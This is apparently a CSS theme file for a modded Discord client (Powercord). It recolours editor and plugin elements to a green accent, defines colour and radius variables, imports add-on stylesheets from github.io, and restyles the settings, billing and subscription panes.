	background: rgba(var(--vaccentcolor), 0.8) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.7)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.7)"] {
	background: rgba(var(--vaccentcolor), 0.7) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.6)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.6)"] {
	background: rgba(var(--vaccentcolor), 0.6) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.5)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.5)"] {
	background: rgba(var(--vaccentcolor), 0.5) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.4)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.4)"] {
	background: rgba(var(--vaccentcolor), 0.4) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.3)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.3)"] {
	background: rgba(var(--vaccentcolor), 0.3) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.2)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.2)"] {
	background: rgba(var(--vaccentcolor), 0.2) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.1)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.1)"] {
	background: rgba(var(--vaccentcolor), 0.1) !important;
}
html .monaco-editor [style*="border-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-color: rgb(9, 71, 113)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-top-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-top-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-top-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-top-color: rgb(9, 71, 113)"] {
	border-top-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-right-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-right-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-right-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-right-color: rgb(9, 71, 113)"] {
	border-right-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-bottom-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-bottom-color: rgb(9, 71, 113)"] {
	border-bottom-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-left-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-left-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-left-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-left-color: rgb(9, 71, 113)"] {
	border-left-color: rgb(var(--vaccentcolor)) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(62, 130, 229)"],
.embedFull-2tM8--[style*="border-color: rgb(62, 130, 226)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		14.		POWERCORDSUPPORT				~~~~ */

.powercord-toast .progressBar-3u8FBM {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		15.		PLUGINSUPPORT					~~~~ */

/* ----		15.1.	IMAGEZOOM						---- */

.zoomLens-uOK8xV {
	border-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.2.	HIDEUTILS						---- */

#HideUtils-Settings button {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.3.	READALLNOTIFICATIONSBUTTON		---- */

.wrapper-1BJsBx:active .childWrapper-anI2G9.button-Jt-tIg{
	background: var(--vaccentcolor-hover);
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
}

/* ----		15.4.	SERVERSEARCH					---- */

#server-search .wrapper-25eVIn {
	background-color: rgb(47, 49, 54) !important;
	transition: background-color .16s ease-out;
}
#server-search .wrapper-25eVIn:hover {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.5.	CHANNELTABS						---- */

.channelTabs-unreadBadge:not(.channelTabs-noUnread) {
	background-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		16.		THEMESUPPORT					~~~~ */

/* ----		16.1.	THEMEDEVBADGE					---- */

#app-mount .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}
#app-mount .topSectionPlaying-1J5E4n .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s,
#app-mount .headerPlaying-j0WQBV .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}

/* --------------------------------------------------------------------------------------------------- */

/* Settings-Icons | Adds icons to the settings menu (made by Snapperito, botato, MulverineX, AAGaming)*/
@import url('https://raw.githack.com/Snapperito/Settings-Icons/main/source.css');

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fonts ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Fonts | Adding Oxygen Font*/
@import url('https://fonts.googleapis.com/css2?family=Oxygen&display=swap');

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Database |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Database | CreArts*/
@import url('https://corellanstoma.github.io/Powercord/Database/usrbg-crearts.css');

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Add-Ons | Old Status Indicator */
@import url("https://corellanstoma.github.io/Powercord/Addons/old-status-indicator.css");

/* Add-Ons | Yellow Permissons */
@import url("https://corellanstoma.github.io/Powercord/Addons/yellow-permissions.css");

/* Add-Ons | Windows Titlebar */
@import url("https://corellanstoma.github.io/Powercord/Addons/windows-titlebar.css");

/* Add-Ons | Mobile Menu */
@import url("https://corellanstoma.github.io/Powercord/Addons/mobile-menu.css");

/* Add-Ons | Autocomplete Scrollable */
@import url("https://corellanstoma.github.io/Powercord/Addons/autocomplete-scrollable.css");

/* Add-Ons | Mention Color*/
@import url("https://corellanstoma.github.io/Powercord/Addons/mention-color.css");

/* Add-Ons | Blur Details*/
@import url("https://corellanstoma.github.io/Powercord/Addons/blur-details");

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Animated |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Animated | Ping */
@import url("https://corellanstoma.github.io/Powercord/Animated/ping.css");

/* Animated | Home Button */
@import url("https://corellanstoma.github.io/Powercord/Animated/home-button.css");

/* Animated | Avatar Hover */
@import url("https://corellanstoma.github.io/Powercord/Animated/avatar-hover.css");

/* Animated | Icons Hover */
@import url("https://corellanstoma.github.io/Powercord/Animated/icons-hover.css");

/* Animated | Chat Highlight */
@import url("https://corellanstoma.github.io/Powercord/Animated/chat-highlight.css");

/* Animated | Channel Highlight */
@import url("https://corellanstoma.github.io/Powercord/Animated/channel-highlight.css");

/* Animated | Profile Badge */
@import url("https://corellanstoma.github.io/Powercord/Animated/profile-badge.css");

/* Animated | Card Hover */
@import url("https://corellanstoma.github.io/Powercord/Animated/card-hover.css");

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Removed ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Removed | Removed the Edited label. */
@import url("https://corellanstoma.github.io/Powercord/Removed/edited.css");

/* Removed | Removed the Nitro home button, the nitro menu can still be accessed via the settings. */
@import url("https://corellanstoma.github.io/Powercord/Removed/nitro-home.css");

/* Removed | Removed the chat header at the beginning of the chat. */
@import url("https://corellanstoma.github.io/Powercord/Removed/chat-header.css");

/* Removed | Removed the Nitro & Gif Button in the Chatbox. Gifs can still be selected using the Emoji button. */
@import url("https://corellanstoma.github.io/Powercord/Removed/gif-nitro-chat.css");

/* Removed | Removed the closed folder background. */
@import url("https://corellanstoma.github.io/Powercord/Removed/closed-folder-background.css");

/* Removed | Removed the Note on the User Profile. */
@import url("https://corellanstoma.github.io/Powercord/Removed/removed-profile-note.css");

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Plugins ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Plugins | Changed the design from "Better Formatting Redux" */
@import url('https://corellanstoma.github.io/Powercord/Plugins/better-formatting-redux.css');

/* Plugins | Total Member Count" */
@import url('https://corellanstoma.github.io/Powercord/Plugins/total-member-count.css');

/* Plugins | Audioviz" */
@import url('https://corellanstoma.github.io/Powercord/Plugins/audioviz.css');

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Theme Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark,
:root {

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Version ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

--version: "v1.2.4 (Beta) (Spotify Edition)"; /*Theme Version*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Font */

    --font: 'Oxygen';

/* Accent */
    --Color001: #04D869;
    --Color010: #43B581;

/* Background */
    --Color002: #33393D;
    --Color003: #262A2D;
    --Color004: #202427;
    --Color005: #1A1D20;

/* Text */
    --Color006: #FFFFFF;
    --Color007: #DCDDDE;
    --Color008: #b9bbbe;
    --Color009: #4F5459;

/* Mention */

    --Mention: 4,216,105;

/* Shadow */

    --shadow001: 0px 8px 12px 4px #00000040;

/* Radius */

    --Radius001: 24px; /* The value should not exceed 24px. */
    --Radius002: 90px; /* The value should not exceed 90px. */

/* Picture-in-oicture Opacity */

    --picture-in-picture: 60%;

/* Avatar Size */

    --avatar-size: 60px;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Blurple Recolor ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --accentcolor: 4,216,105;
    --linkcolor: 4,216,105;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Audioviz |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

--audioviz: var(--Color001);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| SettingsIcons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --settings-icon-color: var(--Color007);
    --settings-subscriptions: var(--Color007);
    --settings-hypesquad: var(--Color007);
    --settings-logout: #f04747;
    --settings-alt-focused: var(--Color007);
    --settings-guild-premium: var(--Color007);
    --settings-guild-delete: #f04747;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Windows 10 Titlebar ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --titlebar-height: 30px;
    --titlebar-drag-margin: 4px;
    --titlebar-button-width: 48px;
    --titlebar-font-size: 12px;
    --titlebar-icon-font-size: 12px;
    --titlebar-background-color: var(--Color005);
    --titlebar-text-color: var(--Color007);
    --titlebar-button-hover: var(--Color003);
    --titlebar-button-active: var(--Color003);
    --titlebar-close-button-hover: var(--Color001);
    --titlebar-close-button-active: var(--Color001);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Radius |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --Radius001: 24px; /* The value should not exceed 24px. */
    --Radius002: 90px; /* The value should not exceed 90px. */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Variables ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

    --background-primary: var(--Color004);
    --background-secondary: var(--Color005);
    --background-secondary-alt: var(--Color002);
    --background-tertiary: var(--Color005);
    --background-accent: var(--Color001);
    --background-floating: var(--Color005);
    --background-modifier-hover: var(--Color004);
    --background-modifier-active: var(--Color004);
    --background-modifier-selected: var(--Color001);
    --background-modifier-accent: var(--Color002);
    --channeltextarea-background: var(--Color001);
    --deprecated-card-bg: var(--Color004);
    --deprecated-card-editable-bg: var(--Color004);
    --deprecated-text-input-bg: var(--Color005);
    --deprecated-text-input-border: var(--Color005);
    --deprecated-text-input-border-disabled: var(--Color005);
    --activity-card-background: var(--Color004);
    --channels-default: var(--Color008);
    --interactive-normal: var(--Color008);
    --interactive-hover: var(--Color006);
    --interactive-active: var(--Color006);
    --interactive-muted: var(--Color009);
    --header-primary: var(--Color006);
    --toast-background: var(--Color006);
    --toast-header: var(--Color005);
    --toast-contents: var(--Color006);
    --toast-box-shadow: rgba(0, 0, 0, .2);
    --toast-border: var(--Color005);
    --header-secondary: var(--Color008);
    --channel-list: var(--Color003);
    --offline-color: var(--Color004);
    --text-normal: var(--Color007);
    --text-muted: var(--Color009);
    --spotify-color: var(--Color001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Mention ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Mention */

.mention-1f5kbO {
    background: var(--Color001);
    opacity: 1;
    height: 20px;
    border-radius: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Version */

.info-1VyQPT .size12-3cLvbJ:last-child::after{
    content: "\a CreArts " var(--version);
    text-transform: none;
    white-space: pre;
}

/* Background */
.sidebarRegionScroller-3MXcoP, .contentRegionScroller-26nc1e {
    background: var(--Color003);
}

/* Sidebar */
.sidebar-CFHs9e {
    background: var(--Color004);
    border-radius: 24px;
    padding: 30px 20px 20px 20px;
    margin: 60px 0px 60px 0px;
    width: 240px;
}

.header-2RyJ0Y {
    font-size: 12px;
    font-weight: 700;
    line-height: 16px;
    text-transform: uppercase;
    color: var(--Color008);
}

/* Content */
.contentColumnDefault-1VQkGM {
	background: var(--Color004);
   	border-radius: 24px;
   	padding-top: 30px;
	margin-top: 60px;
	margin-left: 60px;
	margin-right: 60px;
	margin-bottom: 60px;
}

/* Highlight */
.side-8zPYf6 .themed-OHr7kt.selected-3s45Ha.item-PXvHYJ, .topPill-30KHOu .themed-OHr7kt.selected-3s45Ha.item-PXvHYJ {
    background: var(--Color001);
	border-radius: 90px;
}

.side-8zPYf6 .item-PXvHYJ {
	border-radius: 90px;
}

/* Card */
.card-3Qj_Yx {
	background: var(--Color003);
    border-radius: 24px;
    position: relative;
    border: none;
}

/* Buttons */
.lookOutlined-3sRXeN.colorRed-1TFJan {
    background: var(--Color005);
    color: var(--Color008);
    border: none;
}

.lookOutlined-3sRXeN.colorBrand-3pXr91 {
    background: var(--Color005);
    color: var(--Color008);
    border: none;
}

/* Dropdown*/
.css-1a8reka-control {
    background: var(--Color005);
    border-radius: 90px;
    border: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | My Account |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Profile */
.userSettingsAccount-2eMFVR .userInfoEditing-1CEzdT, .userSettingsAccount-2eMFVR .userInfoViewing-16kqK3 {
    background: var(--Color003);
    border-radius: 24px;
    padding: 20px;
}



/* Two-Factor | Background */
.root-1gCeng {
    border-radius: 24px;
  }

.header-1TKi98 {
    background: var(--Color003);
    border-radius: 24px 24px 0 0;
}

.content-1LAB8Z {
    background-color: var(--Color003);
    border-radius: 24px 24px;
}

.theme-dark .root-1gCeng {
    background-color: var(--Color003);
	box-shadow: var(--shadow001);
}

.theme-dark .separator-2-RRj_ {
    filter: brightness(110%) ;
    box-shadow: none;
}

.theme-dark .footer-2gL1pp {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
}

/* Two-Factor | Input */
.input-cIJ7To {
    border-radius: 24px;
    background-color: var(--Color005);
    border: none;
}

/* Two-Factor Button */
.grow-q77ONN, .sizeIcon-1-kvKI {
  border-radius: 24px;
}

/* Two-Factor Text */
.userSettingsSecurity-3IYeMF .isEnabled-24g9qA {
    color: var(--Color010);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Privacy & Safety |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Round Checkbox */
.box-mmYMsp {
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Authorized Apps ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Connections ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Social Icons Background */
.accountBtn-2Nozo3 .accountBtnInner-sj5jLs {
    background-color: var(--Color003);
	border-radius: 90px;
}

/* Social Card */
.theme-dark .elevationLow-2lY09M {
    -webkit-box-shadow: none;
    box-shadow: none;
	border-radius: 24px;
}

.connectionHeader-2MDqhu {
    background: transparent;
}

.connectionDelete-2Odoln {
    border: 1px solid var(--Color006);
    border-radius: 90px;
}

.connectionDelete-2Odoln:hover {
    border: 1px solid var(--Color007);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Billing ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Indicator */

.theme-dark .defaultIndicator-G3c16x {
    background: var(--Color002);
    color: var(--Color007);
	border-radius: 90px;
}

.theme-dark .premiumIndicator-1XvbfM {
    background: var(--Color001);
    color: #fff;
	border-radius: 90px;
}

/* Payment History | Background*/

.theme-dark .paginator-166-09 {
    background-color: var(--Color004);
}

/* Payment History | Header */

.theme-dark .paymentPane-3bwJ6A{
    background: var(--Color003);
    border-radius: 24px 24px 0 0;
    color: var(--Color007);
}

/* Payment History | Items */

.theme-dark .payment-xT17Mq {
    background: var(--Color002);
    color: var(--Color008);
}

/* Payment History | Footer */

.pageActions-1SVAnA {
    background: var(--Color003);
    border-radius: 0 0 24px 24px;
    color: var(--Color007);
}


.theme-dark .bottomDivider-1K9Gao {
    border-bottom-color: var(--Color003);
}

.theme-dark .expandedInfo-3kfShd {
    background: var(--Color003);
	border-radius: 24px;
}


/* Payment History | Buttons */

.theme-dark .pageButtonNext-V2kUq0, .pageButtonPrev-1Y-47D, .pageIndicator-1gAbyA {
    border: none;
    background: var(--Color003);
}

.pageButtonPrev-1Y-47D, .pageButtonNext-V2kUq0 {
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Subscriptions |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Banner */

.tier2-3hSil0.banner-3Kac2g {
    background: var(--Color001);
    border-radius: 24px;
}

.bannerBackgroundImage-1DMjWi {
	border-radius: 24px;
}

/* No Header */

.hero-EvfTTA {
    display: none;
}

.detailsBlock-FoDTGA {
    background: var(--Color003);
    border-radius: 24px;
}

.hero-EvfTTA {
    border-radius: 24px;
}

/* Input */

.lookFilled-1h1y05.select-1Pkeg4 {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
}

.lookFilled-1h1y05.popout-2sKjHu {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
    margin-top: -38px;

}

.optionActive-KkAdqq, .optionFocused-8MflSE {
    background: var(--Color005);
}

.lookFilled-1h1y05 .arrow-2KJjTM {
    z-index: 20;
    color: var(--Color007);
}

/* Nitro Includes */

.base-1x0h_U {
    color: var(--Color007);
}

.size32-o_H79z {
    font-size: 22px;
    line-height: 20px;
}

.theme-dark .feature-2w65J5 {
    background: var(--Color003);
}

.feature-2w65J5 {
    border-radius: 24px;
    min-height: 90px;
}

.featureGrid-3-fNl- {
    grid-template-columns: repeat(auto-fill,322px);
}

.featureImageWrapper-pPDLjm {
    display: none;
}

/* Buy Nitro */

.marketingRefreshTier2Cta-bw9Vyc {
    background: var(--Color003);
    border-radius: 24px;
    padding: 24px;
    text-align: center;
    margin-top: 48px;
    border: none;
}

/* Buy Nitro Classic */

.marketingRefreshTier1Logo-sY6Lgd {
    color: var(--header-primary);
    display: block;
    height: 20px;
    margin-bottom: 8px;
    width: 194px;
}

.marketingRefreshSectionTier1-dRwS-6 {
    background: var(--Color003);
    border-radius: 24px;
    padding: 24px;
    text-align: center;
    margin-top: 48px;
    border: none;
}


.marketingRefreshTier1Graphic-9B12wx {
    display: none;
    height: 148px;
